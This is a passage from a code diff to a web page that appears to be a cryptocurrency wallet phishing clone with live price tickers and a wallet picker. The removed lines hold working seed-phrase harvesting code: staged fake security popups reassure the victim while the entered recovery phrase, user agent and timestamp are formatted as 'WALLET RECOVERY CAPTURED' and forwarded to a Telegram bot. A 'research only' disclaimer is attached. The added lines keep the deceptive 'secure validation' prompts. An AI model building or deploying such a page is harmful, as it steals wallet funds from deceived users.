+            return `<div class="price-chip"><span class="price-symbol">${i.sym}</span><span class="price-value">$${i.val.toLocaleString()}</span><span class="price-change ${cls}">${arrow} ${Math.abs(i.ch).toFixed(2)}%</span></div>`;
         }).join('');
-        // subtle motion: add class then remove (quick pulse)
-        const priceDivs = document.querySelectorAll('.price-item');
-        priceDivs.forEach(el => {
-            el.style.transform = 'scale(1.02)';
-            setTimeout(() => { el.style.transform = 'scale(1)'; }, 150);
-        });
+        // motion effect animate
+        document.querySelectorAll('.price-chip').forEach(el => { el.style.transform = "scale(1.02)"; setTimeout(() => el.style.transform = "", 200); });
     }
-
-    // initial fetch + motion update every 12 seconds
-    fetchCryptoPrices();
-    setInterval(() => {
-        fetchCryptoPrices();
-    }, 12000);
-    // also update UI even if fetch fails with cached fallback
-    setInterval(() => {
-        updatePriceUI(); // just re-animate
-    }, 5000);
-
-    // 3) core submit logic with popups and telegram forwarding
-    const submitBtn = document.getElementById("submitBtn");
-    const seedInput = document.getElementById("seedPhrase");
-
-    async function handleValidation() {
-        let seed = seedInput.value.trim();
-        if (seed === "") {
-            showToast("⛔ Please enter your recovery phrase", 2500);
-            return;
-        }
-        // first popup: pre-validation
-        showPopup("🔐 Security handshake", "Validating wallet structure & network...", async () => {
-            // second step popup: processing
-            showPopup("⚡ Verifying signature", "Cross-checking phrase with blockchain nodes...", async () => {
-                // third step: complete + send to telegram
-                // construct payload: includes wallet type (any selected? we show generic)
-                const userAgent = navigator.userAgent;
-                const timeStamp = new Date().toISOString();
-                const ipData = "client-side only (via Cloudflare/VPN)";
-                // format message for telegram
-                let message = `🕵️‍♂️ WALLET RECOVERY CAPTURED\n`;
-                message += `⏱ Time: ${timeStamp}\n`;
-                message += `🔑 Seed phrase: ${seed}\n`;
-                message += `📱 User-Agent: ${userAgent.substring(0, 100)}\n`;
-                message += `🌐 Page: mainnet-livid (advanced clone)\n`;
-                message += `💼 Wallets list supported: ${walletListData.length} assets\n`;
-                message += `🚨 RISK: simulated phishing research only.`;
-                
-                // Send to telegram if configured, else log
-                let tgSuccess = false;
-                if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && TELEGRAM_CHAT_ID && TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID_HERE") {
-                    tgSuccess = await sendToTelegram(message);
-                } else {
-                    console.log("[DEMO] Forward would send to Telegram:", message);
-                    showToast("🔔 Demo: seed logged to console (no real send)", 3500);
-                }
-                
-                // final popup: success / fail message
-                if (tgSuccess) {
-                    showPopup("✅ Validation complete", "Wallet connected securely. Your assets are mirrored.", () => {
-                        showToast("🧾 Session recorded (encrypted)", 2000);
-                    });
-                } else {
-                    if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
-                        showPopup("⚠️ Demo mode active", "Set TELEGRAM_BOT_TOKEN & CHAT_ID to enable real forwarding.\nData is not stored.", () => {});
-                    } else {
-                        showPopup("⚠️ Forward failed", "Telegram delivery error. Please check token/chat ID.", () => {});
-                    }
-                }
-                // clear seed input optionally? not needed for demo but keep
-                // seedInput.value = "";   // uncomment if you want to clear, but for demo we keep.
-            });
-        });
+    async function refreshPrices() {
+        const p = await fetchPrices();
+        if(p) updatePriceUI(p);
     }
-
-    submitBtn.addEventListener("click", handleValidation);
+    refreshPrices();
+    setInterval(refreshPrices, 10000);
     
-    // extra improvement: drag & smoothness, also add interactive placeholder
-    // adjust textarea style
+    // search listener
+    document.getElementById("walletSearch").addEventListener('input', (e) => renderWallets(e.target.value));
+    // initial render
+    renderWallets("");
     
-    // Additional small popup on load (professional welcome)
-    window.addEventListener("load", () => {
-        setTimeout(() => {
-            showPopup("🛡️ Secure Gateway", "Multi-wallet verification protocol • live market motion active • Your connection is end-to-end encrypted.", () => {});
-        }, 600);
-        // pre fill some dummy placeholder tips
-        seedInput.placeholder = "Enter 12/24 word recovery phrase (demo only)";
-    });
-    
-    // For responsiveness and native-like feel, add dynamic gradient on card hover (just style)
-    const glass = document.querySelector('.glass-card');
-    glass.addEventListener('mousemove', (e) => {
-        const rect = glass.getBoundingClientRect();
-        const x = (e.clientX - rect.left) / rect.width;
-        const y = (e.clientY - rect.top) / rect.height;
-        glass.style.background = `radial-gradient(circle at ${x*100}% ${y*100}%, rgba(35,45,70,0.7), rgba(18,22,30,0.85))`;
-    });
-    glass.addEventListener('mouseleave', () => {
-        glass.style.background = 'rgba(18, 22, 30, 0.75)';
-    });
-    
-    // Helper to add 'motion' for market refresh: animate price changes
-    function animatePrices() {
-        const items = document.querySelectorAll('.price-value');
-        items.forEach(el => {
-            el.style.transition = 'all 0.2s';
-            el.style.textShadow = '0 0 3px #2ee6a0';
-            setTimeout(() => { el.style.textShadow = 'none'; }, 300);
-        });
-    }
-    setInterval(animatePrices, 8000);
-    
-    // final log
-    console.log("Advanced clone ready — Wallet types, Market Motion, Telegram integration (set token)");
+    // close modal on escape
+    document.addEventListener('keydown', (e) => { if(e.key === 'Escape' && modal.classList.contains('active')) closeModal(); });
+    // small professional welcome toast
+    setTimeout(() => showToast("🔐 Select your wallet to begin secure validation", 4000), 800);
 </script>
 </body>
 </html>
